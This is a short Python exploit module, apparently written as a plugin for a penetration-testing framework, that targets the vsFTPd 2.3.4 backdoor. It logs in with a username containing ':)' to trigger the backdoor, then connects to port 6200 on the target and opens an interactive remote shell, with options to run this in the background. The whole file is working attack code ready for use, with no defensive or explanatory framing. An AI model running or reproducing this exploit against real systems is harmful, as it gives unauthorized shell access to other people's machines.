from colorama import Fore, init
from telnetlib import Telnet
import socket
import time

init(autoreset=True)
arguments = ['RHOSTS', "RPORTS", 'BACKGROUND']

def exploit(parametre):

    try:
        host=parametre['RHOSTS']
        port=parametre['RPORTS']
    except KeyError as exception:
        print(Fore.RED+"[+] {} is not defined".format(exception.__str__()))
        return

    try:
       port=int(port)
       if port > 65536:
           print(Fore.RED + "[+] RPORTS doit etre un nombre <= 65536")
           return
    except:
        print(Fore.RED + "[+] RPORTS doit etre un nombre <= 65536")
        return

    user = "USER nergal:)"
    password = "PASS pass"
    tn = Telnet(host, port)
    tn.read_until(b"(vsFTPd 2.3.4)") #if necessary, edit this line
    tn.write(user.encode('ascii') + b"\n")
    tn.read_until(b"password.") #if necessary, edit this line
    tn.write(password.encode('ascii') + b"\n")

    time.sleep(5)
    tn2 = Telnet(host, 6200)
    if parametre['BACKGROUND'] == False:
        print(Fore.RED + 'Success, shell opened !')
        print(Fore.RED + "Tap 'exit' for quit ")
        tn2.interact()
    elif parametre['BACKGROUND'] == True:
        return tn2.interact
    else:
        print('[+] BACKGROUND is True or False')

def notice(parametres,arguments):

    for i in arguments:
        try:
            print('\t{name} :\t{value}'.format(name=i,value=parametres[i]))
        except KeyError:
            print('\t{name} :\t'.format(name=i))
    

def auto_args(args):
    args['RPORTS'] = 21
    args['BACKGROUND'] = False

